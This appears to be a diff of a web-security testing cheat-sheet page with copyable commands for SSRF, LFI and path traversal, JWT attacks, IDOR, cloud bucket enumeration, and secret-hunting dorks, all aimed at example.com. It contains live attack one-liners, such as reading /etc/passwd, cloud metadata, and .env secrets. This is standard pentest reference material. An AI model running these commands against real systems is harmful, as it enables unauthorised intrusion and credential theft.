+  <section id="ssrf" class="section" data-section>
+    <div class="section-header">
+      <h2>SSRF Testing</h2>
+      <p>Probe for Server-Side Request Forgery vulnerabilities via URL parameters.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>SSRF via URL Param</h3><span class="chip chip-critical">curl</span></div>
+        <p>Send request with internal IP to detect SSRF.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>Blind SSRF (Burp Collaborator)</h3><span class="chip chip-high">curl</span></div>
+        <p>Use an out-of-band collaborator URL to detect blind SSRF.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/fetch?url=https://YOUR.burpcollaborator.net"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>SSRF via Headers</h3><span class="chip chip-high">curl</span></div>
+        <p>Inject SSRF payloads in common headers like X-Forwarded-For.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/" -H "X-Forwarded-For: 127.0.0.1" -H "X-Custom-IP-Authorization: 127.0.0.1"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>SSRF Nuclei Templates</h3><span class="chip chip-high">nuclei</span></div>
+        <p>Automated SSRF detection across URLs using nuclei.</p>
+        <div class="code-wrap"><pre><code>nuclei -l urls.txt -t vulnerabilities/generic/ssrf/ -silent</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- LFI / RFI -->
+  <section id="lfi" class="section" data-section>
+    <div class="section-header">
+      <h2>LFI / RFI Testing</h2>
+      <p>Test for Local and Remote File Inclusion vulnerabilities.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>LFI Payload Fuzzing</h3><span class="chip chip-critical">ffuf</span></div>
         <p>Fuzz file inclusion parameters using LFI payload list.</p>
-        <pre><code>ffuf -w LFI_payloads.txt -u example.com/file?id=FUZZ</code></pre>
+        <div class="code-wrap"><pre><code>ffuf -w LFI_payloads.txt -u "https://example.com/file?path=FUZZ" -mr "root:"</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Sensitive File Discovery -->
-  <section id="sensitive" class="section alt">
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>LFI via Wrapper (PHP)</h3><span class="chip chip-critical">curl</span></div>
+        <p>Use PHP filter wrapper to read source code via LFI.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/?page=php://filter/convert.base64-encode/resource=index"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-red" data-card>
+        <div class="card-head"><h3>Path Traversal Check</h3><span class="chip chip-high">curl</span></div>
+        <p>Basic path traversal to read /etc/passwd.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/?file=../../../../etc/passwd"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- OPEN REDIRECT -->
+  <section id="openredirect" class="section" data-section>
+    <div class="section-header">
+      <h2>Open Redirect Testing</h2>
+      <p>Detect open redirect vulnerabilities exploitable for phishing and token theft.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-cyan" data-card>
+        <div class="card-head"><h3>Basic Open Redirect</h3><span class="chip chip-medium">curl</span></div>
+        <p>Send redirect parameter pointing to an external domain.</p>
+        <div class="code-wrap"><pre><code>curl -s -o /dev/null -w "%{redirect_url}" "https://example.com/redirect?url=https://evil.com"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-cyan" data-card>
+        <div class="card-head"><h3>Bulk Open Redirect</h3><span class="chip chip-medium">openredirex</span></div>
+        <p>Mass test URLs for open redirect via common parameters.</p>
+        <div class="code-wrap"><pre><code>cat urls.txt | openredirex -p payloads/open-redirect.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-cyan" data-card>
+        <div class="card-head"><h3>Param Extraction + Test</h3><span class="chip chip-medium">grep + curl</span></div>
+        <p>Extract redirect params from wayback and test them.</p>
+        <div class="code-wrap"><pre><code>waybackurls example.com | grep -iE "redirect|return|url|next|dest" | sort -u</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- JWT TESTING -->
+  <section id="jwt" class="section" data-section>
+    <div class="section-header">
+      <h2>JWT Testing</h2>
+      <p>Attack JWT tokens: algorithm confusion, none attack, weak secrets.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>Decode JWT</h3><span class="chip">jwt_tool</span></div>
+        <p>Decode and inspect JWT payload without verification.</p>
+        <div class="code-wrap"><pre><code>python3 jwt_tool.py YOUR_JWT_TOKEN</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>None Algorithm Attack</h3><span class="chip chip-critical">jwt_tool</span></div>
+        <p>Test if server accepts unsigned tokens (alg:none).</p>
+        <div class="code-wrap"><pre><code>python3 jwt_tool.py YOUR_JWT_TOKEN -X a</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>Weak Secret Crack</h3><span class="chip chip-critical">hashcat</span></div>
+        <p>Crack HS256 JWT secret using wordlist.</p>
+        <div class="code-wrap"><pre><code>hashcat -a 0 -m 16500 jwt.txt /wordlists/rockyou.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-purple" data-card>
+        <div class="card-head"><h3>RS256 → HS256 Confusion</h3><span class="chip chip-critical">jwt_tool</span></div>
+        <p>Exploit algorithm confusion from RSA to HMAC.</p>
+        <div class="code-wrap"><pre><code>python3 jwt_tool.py YOUR_JWT_TOKEN -X k -pk public.pem</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- API RECON -->
+  <section id="api" class="section" data-section>
+    <div class="section-header">
+      <h2>API Recon &amp; Testing</h2>
+      <p>Discover hidden API endpoints, test for broken auth and excessive data exposure.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-green" data-card>
+        <div class="card-head"><h3>API Endpoint Discovery</h3><span class="chip">ffuf</span></div>
+        <p>Fuzz for common API routes with wordlist.</p>
+        <div class="code-wrap"><pre><code>ffuf -u https://example.com/api/FUZZ -w wordlists/api_endpoints.txt -mc 200,201,401,403</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-green" data-card>
+        <div class="card-head"><h3>API Version Enumeration</h3><span class="chip">ffuf</span></div>
+        <p>Discover old/deprecated API versions (v1, v2, v3...).</p>
+        <div class="code-wrap"><pre><code>ffuf -u https://example.com/FUZZ/users -w wordlists/api_versions.txt -mc 200,401</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-green" data-card>
+        <div class="card-head"><h3>Check for Swagger/OpenAPI</h3><span class="chip">curl</span></div>
+        <p>Look for exposed API documentation.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/api-docs" "https://example.com/swagger.json" "https://example.com/openapi.json"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-green" data-card>
+        <div class="card-head"><h3>BOLA / IDOR Test</h3><span class="chip chip-critical">curl</span></div>
+        <p>Test for object-level authorization by changing IDs.</p>
+        <div class="code-wrap"><pre><code>for i in $(seq 1 100); do curl -s "https://example.com/api/user/$i" -H "Authorization: Bearer TOKEN" | grep -v "unauthorized"; done</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-green" data-card>
+        <div class="card-head"><h3>GraphQL Introspection</h3><span class="chip">curl</span></div>
+        <p>Dump entire schema from GraphQL endpoint.</p>
+        <div class="code-wrap"><pre><code>curl -s -X POST "https://example.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- CLOUD RECON -->
+  <section id="cloud" class="section" data-section>
+    <div class="section-header">
+      <h2>Cloud Recon (S3 / Azure / GCP)</h2>
+      <p>Discover misconfigured cloud storage buckets and exposed cloud assets.</p>
+    </div>
+    <div class="grid">
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>S3 Bucket Enumeration</h3><span class="chip">s3scanner</span></div>
+        <p>Scan for open and misconfigured S3 buckets.</p>
+        <div class="code-wrap"><pre><code>s3scanner scan --buckets-file buckets.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>S3 Public Read Check</h3><span class="chip">aws-cli</span></div>
+        <p>Check if an S3 bucket allows public listing.</p>
+        <div class="code-wrap"><pre><code>aws s3 ls s3://target-bucket --no-sign-request</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>GCP Bucket Check</h3><span class="chip">curl</span></div>
+        <p>Probe Google Cloud Storage bucket for public access.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://storage.googleapis.com/target-bucket/?prefix=" | grep -oP "(?<=&lt;Key&gt;)[^&lt;]+"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Azure Blob Storage</h3><span class="chip">curl</span></div>
+        <p>Enumerate files in Azure Blob container (if public).</p>
+        <div class="code-wrap"><pre><code>curl -s "https://TARGET.blob.core.windows.net/CONTAINER?restype=container&comp=list"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card card-orange" data-card>
+        <div class="card-head"><h3>Cloud Asset Discovery</h3><span class="chip">cloudbrute</span></div>
+        <p>Bruteforce company-specific cloud storage names.</p>
+        <div class="code-wrap"><pre><code>cloudbrute -d example.com -k company -t 80</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- SENSITIVE FILES -->
+  <section id="sensitive" class="section" data-section>
     <div class="section-header">
       <h2>Sensitive File Discovery</h2>
       <p>Locate robots, backups and exposed configuration files.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>Robots.txt Analysis</h3>
-          <span class="chip">curl + grep</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Robots.txt Analysis</h3><span class="chip">curl + grep</span></div>
         <p>Extract disallowed paths and sitemaps.</p>
-        <pre><code>curl -s example.com/robots.txt | grep -E "Disallow:|Sitemap:"</code></pre>
+        <div class="code-wrap"><pre><code>curl -s example.com/robots.txt | grep -E "Disallow:|Sitemap:"</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Common Backups</h3>
-          <span class="chip">ffuf</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Common Backups</h3><span class="chip">ffuf</span></div>
         <p>Bruteforce common backup filenames.</p>
-        <pre><code>ffuf -w wordlists/common_backups.txt -u example.com/FUZZ</code></pre>
+        <div class="code-wrap"><pre><code>ffuf -w wordlists/common_backups.txt -u example.com/FUZZ -mc 200</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Hidden Parameter Discovery -->
-  <section id="hidden" class="section">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Git Repo Exposure</h3><span class="chip">git-dumper</span></div>
+        <p>Dump exposed .git directory from web server.</p>
+        <div class="code-wrap"><pre><code>git-dumper https://example.com/.git/ ./dumped_repo/</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>.env File Leak</h3><span class="chip">curl</span></div>
+        <p>Check for exposed .env configuration files.</p>
+        <div class="code-wrap"><pre><code>curl -s "https://example.com/.env" | grep -iE "KEY|SECRET|PASSWORD|TOKEN"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- HIDDEN PARAMS -->
+  <section id="hidden" class="section" data-section>
     <div class="section-header">
       <h2>Hidden Parameter Discovery</h2>
       <p>Uncover hidden HTTP parameters for further fuzzing and logic testing.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>Param Mining (Basic)</h3>
-          <span class="chip">Arjun</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Param Mining (Arjun)</h3><span class="chip">Arjun</span></div>
         <p>Automatically discover parameters for a given endpoint.</p>
-        <pre><code>Arjun -u example.com/index.php</code></pre>
+        <div class="code-wrap"><pre><code>python3 arjun.py -u https://example.com/index.php</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Guess Parameters</h3>
-          <span class="chip">ffuf</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Guess Parameters (ffuf)</h3><span class="chip">ffuf</span></div>
         <p>Guess parameters with a custom wordlist.</p>
-        <pre><code>ffuf -w wordlists/params.txt -u example.com/index.php?FUZZ=1</code></pre>
+        <div class="code-wrap"><pre><code>ffuf -w wordlists/params.txt -u example.com/index.php?FUZZ=1 -mc 200</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Directory & File Bruteforcing -->
-  <section id="dir" class="section alt">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Mass Parameter Mining</h3><span class="chip">paramspider</span></div>
+        <p>Extract parameters from Web Archive for a domain.</p>
+        <div class="code-wrap"><pre><code>python3 paramspider.py -d example.com --output params.txt</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- DIR & FILE BRUTEFORCE -->
+  <section id="dir" class="section" data-section>
     <div class="section-header">
       <h2>Directory &amp; File Bruteforcing</h2>
       <p>Enumerate hidden directories, files and interesting extensions.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>Dir &amp; File Discovery</h3>
-          <span class="chip">gobuster</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>Dir &amp; File Discovery</h3><span class="chip">gobuster</span></div>
         <p>Bruteforce directories and files with wordlists.</p>
-        <pre><code>gobuster dir -u example.com -w /wordlists/dir.txt -t 50</code></pre>
+        <div class="code-wrap"><pre><code>gobuster dir -u example.com -w /wordlists/dir.txt -t 50</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Extension Enumeration</h3>
-          <span class="chip">ffuf</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Extension Enumeration</h3><span class="chip">ffuf</span></div>
         <p>Probe for alternate extensions of files.</p>
-        <pre><code>ffuf -w /wordlists/extensions.txt -u example.com/indexFUZZ</code></pre>
+        <div class="code-wrap"><pre><code>ffuf -w /wordlists/extensions.txt -u example.com/indexFUZZ -mc 200,403</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- WordPress Security Testing -->
-  <section id="wp" class="section">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Recursive Scan</h3><span class="chip">feroxbuster</span></div>
+        <p>Recursive directory enumeration with auto-depth.</p>
+        <div class="code-wrap"><pre><code>feroxbuster -u https://example.com -w /wordlists/dir.txt --depth 3 -x php,html,js</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- WORDPRESS -->
+  <section id="wp" class="section" data-section>
     <div class="section-header">
       <h2>WordPress Security Testing</h2>
       <p>Enumerate versions, plugins and themes for vulnerable components.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>WP Version &amp; Info</h3>
-          <span class="chip">wpscan</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>WP Version &amp; Info</h3><span class="chip">wpscan</span></div>
         <p>Enumerate core version and vulnerabilities.</p>
-        <pre><code>wpscan --url example.com --enumerate vp</code></pre>
+        <div class="code-wrap"><pre><code>wpscan --url example.com --enumerate vp --api-token YOUR_TOKEN</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Plugin &amp; Theme Scan</h3>
-          <span class="chip">wpscan</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Plugin &amp; Theme Scan</h3><span class="chip">wpscan</span></div>
         <p>Scan for vulnerable plugins and themes.</p>
-        <pre><code>wpscan --url example.com --enumerate ap,at</code></pre>
+        <div class="code-wrap"><pre><code>wpscan --url example.com --enumerate ap,at --api-token YOUR_TOKEN</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- CORS Testing -->
-  <section id="cors" class="section alt">
+      <div class="card" data-card>
+        <div class="card-head"><h3>WP User Enumeration</h3><span class="chip">wpscan</span></div>
+        <p>Enumerate WordPress usernames for brute-force attacks.</p>
+        <div class="code-wrap"><pre><code>wpscan --url example.com --enumerate u --force</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>WP XML-RPC Check</h3><span class="chip">curl</span></div>
+        <p>Test if xmlrpc.php is exposed and usable.</p>
+        <div class="code-wrap"><pre><code>curl -s https://example.com/xmlrpc.php -d '&lt;?xml version="1.0"?>&lt;methodCall>&lt;methodName>system.listMethods&lt;/methodName>&lt;/methodCall>'</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- CORS -->
+  <section id="cors" class="section" data-section>
     <div class="section-header">
       <h2>CORS Testing</h2>
       <p>Detect misconfigured Cross‑Origin Resource Sharing policies.</p>
     </div>
     <div class="grid">
-      <div class="card">
-        <div class="card-head">
-          <h3>CORS Misconfig Check</h3>
-          <span class="chip">nuclei</span>
-        </div>
+
+      <div class="card" data-card>
+        <div class="card-head"><h3>CORS Misconfig (nuclei)</h3><span class="chip">nuclei</span></div>
         <p>Bulk test URLs for CORS misconfigurations.</p>
-        <pre><code>cat urls.txt | nuclei -t cors-misconfig.yaml</code></pre>
+        <div class="code-wrap"><pre><code>cat urls.txt | nuclei -t cors-misconfig.yaml -silent</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <div class="card-head">
-          <h3>Manual Origin Fuzz</h3>
-          <span class="chip">curl</span>
-        </div>
+      <div class="card" data-card>
+        <div class="card-head"><h3>Manual Origin Fuzz</h3><span class="chip">curl</span></div>
         <p>Send a crafted Origin header to probe CORS behaviour.</p>
-        <pre><code>curl -i -X GET "https://example.com" -H "Origin: evil.com"</code></pre>
+        <div class="code-wrap"><pre><code>curl -i -X GET "https://example.com/api/data" -H "Origin: evil.com" | grep -i "access-control"</code></pre><button class="copy-btn">copy</button></div>
       </div>
-    </div>
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
-  </section>
 
-  <!-- Google Dork Queries -->
-  <section id="dorks" class="section">
+      <div class="card" data-card>
+        <div class="card-head"><h3>Null Origin Test</h3><span class="chip">curl</span></div>
+        <p>Test if server reflects null origin (sandbox bypass).</p>
+        <div class="code-wrap"><pre><code>curl -i -H "Origin: null" "https://example.com/api/data" | grep -i "access-control-allow-origin"</code></pre><button class="copy-btn">copy</button></div>
+      </div>
+
+    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
+  </section><hr class="section-divider">
+
+  <!-- GOOGLE DORKS -->
+  <section id="dorks" class="section" data-section>
     <div class="section-header">
-      <h2>Google Dork Queries (site:example.com)</h2>
-      <p>Use these dorks to discover exposed assets, configs and intelligence around the target.</p>
+      <h2>Google Dork Queries <code style="font-size:14px;color:var(--muted)">(site:example.com)</code></h2>
+      <p>Use these dorks to discover exposed assets, configs and OSINT intelligence around the target.</p>
     </div>
 
     <div class="grid grid-2">
-      <div class="card">
-        <h3>Discovery &amp; Exposure</h3>
-        <pre><code>site:example.com intitle:"index of"</code></pre>
-        <pre><code>site:example.com ext:env OR ext:conf OR ext:ini</code></pre>
-        <pre><code>site:example.com ext:sql OR ext:sqlite OR ext:db</code></pre>
-        <pre><code>site:example.com inurl:wp-admin OR inurl:wp-content</code></pre>
-        <pre><code>site:example.com ext:log OR ext:txt intext:password</code></pre>
-        <pre><code>site:example.com ext:bak OR ext:old OR ext:zip OR ext:tar.gz</code></pre>
-        <pre><code>site:example.com inurl:login OR inurl:admin OR inurl:dashboard</code></pre>
-        <pre><code>site:example.com intext:"sql syntax" OR intext:"mysql error"</code></pre>
-        <pre><code>site:example.com ext:pdf OR ext:docx OR ext:pptx</code></pre>
-        <pre><code>site:example.com inurl:phpinfo.php</code></pre>
-        <pre><code>site:example.com "c99.php" OR "r57.php"</code></pre>
-        <pre><code>site:example.com inurl:install OR inurl:setup</code></pre>
+      <div class="card" data-card>
+        <h3 style="margin-bottom:12px">Discovery &amp; Exposure</h3>
+        <div class="code-wrap"><pre><code>site:example.com intitle:"index of"</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:env OR ext:conf OR ext:ini</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:sql OR ext:sqlite OR ext:db</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:wp-admin OR inurl:wp-content</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:log OR ext:txt intext:password</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:bak OR ext:old OR ext:zip OR ext:tar.gz</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:login OR inurl:admin OR inurl:dashboard</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com intext:"sql syntax" OR intext:"mysql error"</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:pdf OR ext:docx OR ext:pptx</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:phpinfo.php</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com "c99.php" OR "r57.php"</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:install OR inurl:setup</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com ext:yaml OR ext:yml intext:password</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com intext:"API_KEY" OR intext:"api_secret"</code></pre><button class="copy-btn">copy</button></div>
       </div>
 
-      <div class="card">
-        <h3>External Intel &amp; OSINT</h3>
-        <pre><code>site:example.com inurl:url=http OR inurl:redir=http</code></pre>
-        <pre><code>site:example.com ext:action OR ext:do filetype:action</code></pre>
-        <pre><code>site:pastebin.com example.com</code></pre>
-        <pre><code>site:linkedin.com "employees" "example.com"</code></pre>
-        <pre><code>site:example.com inurl:.htaccess</code></pre>
-        <pre><code>site:*.example.com</code></pre>
-        <pre><code>site:*.*.example.com</code></pre>
-        <pre><code>site:web.archive.org/web/ example.com inurl:wp-admin</code></pre>
-        <pre><code>site:github.com example.com</code></pre>
-        <pre><code>site:openbugbounty.org example.com</code></pre>
-        <pre><code>site:reddit.com example.com</code></pre>
-        <pre><code>site:example.com inurl:crossdomain.xml</code></pre>
-        <pre><code>site:threatcrowd.org example.com</code></pre>
-        <pre><code>site:example.com ext:swf</code></pre>
-        <pre><code>site:crt.sh example.com</code></pre>
-        <pre><code>site:censys.io ip:example.com</code></pre>
-        <pre><code>site:shodan.io example.com</code></pre>
+      <div class="card" data-card>
+        <h3 style="margin-bottom:12px">External Intel &amp; OSINT</h3>
+        <div class="code-wrap"><pre><code>site:example.com inurl:url=http OR inurl:redir=http</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:pastebin.com example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:linkedin.com "employees" "example.com"</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:.htaccess</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:*.example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:*.*.example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:web.archive.org/web/ example.com inurl:wp-admin</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:github.com example.com "api_key" OR "password"</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:openbugbounty.org example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:reddit.com example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:example.com inurl:crossdomain.xml</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:crt.sh example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:censys.io ip:example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:shodan.io example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:trello.com example.com</code></pre><button class="copy-btn">copy</button></div>
+        <div class="code-wrap"><pre><code>site:jira.example.com OR site:confluence.example.com</code></pre><button class="copy-btn">copy</button></div>
       </div>
     </div>
-
-    <div class="category-footer">
-      <button class="btn btn-outline">Just Hack 🤓</button>
-    </div>
+    <div class="category-footer"><button class="btn btn-outline">Just Hack 🤓</button></div>
   </section>
 
-  <!-- Footer -->
+  <!-- FOOTER -->
   <footer class="footer">
-    <p>No limit how you dig but remember to boost your self</p>
+    <p>No limit how you dig — but remember to <span>boost your self</span> 🚀</p>
+    <p style="margin-top:8px;font-size:11px;color:#444">Use responsibly. Happy Hacking.</p>
   </footer>
+
+  <!-- JUMP TO TOP -->
+  <button id="jump-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+  <script>
+    // COPY BUTTONS
+    document.querySelectorAll('.copy-btn').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const code = btn.previousElementSibling.querySelector('code').innerText;
+        navigator.clipboard.writeText(code).then(() => {
+          btn.textContent = 'done!';
+          btn.classList.add('copied');
+          setTimeout(() => { btn.textContent = 'copy'; btn.classList.remove('copied'); }, 1500);
+        });
+      });
+    });
+
+    // SCROLL TO TOP BUTTON
+    const jumpTop = document.getElementById('jump-top');
+    window.addEventListener('scroll', () => {
+      jumpTop.classList.toggle('show', window.scrollY > 400);
+    });
+
+    // SEARCH / FILTER
+    const searchInput = document.getElementById('searchInput');
+    const searchCount = document.getElementById('searchCount');
+
+    searchInput.addEventListener('input', () => {
+      const q = searchInput.value.toLowerCase().trim();
+      const allCards = document.querySelectorAll('[data-card]');
+      let visible = 0;
+
+      allCards.forEach(card => {
+        const text = card.textContent.toLowerCase();
+        const match = !q || text.includes(q);
+        card.classList.toggle('hidden', !match);
+        if (match) visible++;
+      });
+
+      // Hide sections where all cards are hidden
+      document.querySelectorAll('[data-section]').forEach(section => {
+        const cards = section.querySelectorAll('[data-card]');
+        const anyVisible = [...cards].some(c => !c.classList.contains('hidden'));
+        section.style.display = anyVisible ? '' : 'none';
+      });
+
+      searchCount.textContent = q ? `${visible} result${visible !== 1 ? 's' : ''}` : '';
+    });
+  </script>
 </body>
 </html>
-
-
-
